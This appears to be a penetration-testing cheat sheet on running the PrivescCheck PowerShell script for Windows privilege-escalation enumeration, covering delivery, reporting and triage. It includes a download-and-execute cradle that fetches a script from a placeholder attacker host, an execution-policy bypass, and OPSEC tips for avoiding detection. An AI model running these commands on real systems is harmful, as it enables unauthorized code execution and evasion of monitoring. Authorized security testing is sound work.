# PrivescCheck PowerShell Delivery, OPSEC & Reporting

## When PrivescCheck Is the Better First Move

Use `PrivescCheck` before `WinPEAS` when:
- EXE delivery is blocked or inconvenient
- PowerShell script execution is still viable
- you want cleaner, more readable results
- you need HTML output for offline triage or reporting

## Delivery Patterns

### In-memory execution

```powershell
IEX (New-Object Net.WebClient).DownloadString("http://ATTACKER/PrivescCheck.ps1"); Invoke-PrivescCheck
```

### Local execution with policy bypass

```powershell
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
```

### Extended report generation

```powershell
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Report privesc_report -Format HTML
```

## Practical Triage Order

1. Services
2. Scheduled tasks
3. Registry policy (`AlwaysInstallElevated`, autoruns)
4. Token privileges
5. DLL / COM hijack candidates
6. Stored credential remnants

## Reporting Workflow

- Generate HTML for slower offline review.
- Keep raw console output if you need grep-like quick checks.
- Cross-check any high-value finding with manual validation before exploitation.

## OPSEC Notes

- Pure PowerShell can blend better than dropping an EXE, but it is still detectable.
- Avoid repeated in-memory downloads from the same URL if the environment is monitored.
- Prefer local copy execution after first delivery if repeated testing is needed.
- Validate exploitability manually; readable output does not equal writable path.

## Pairing Strategy

- `PrivescCheck` first: readable, PowerShell-native pass
- `WinPEAS` second: breadth and aggressive follow-up enumeration
- `Watson` if patch/CVE angle becomes primary
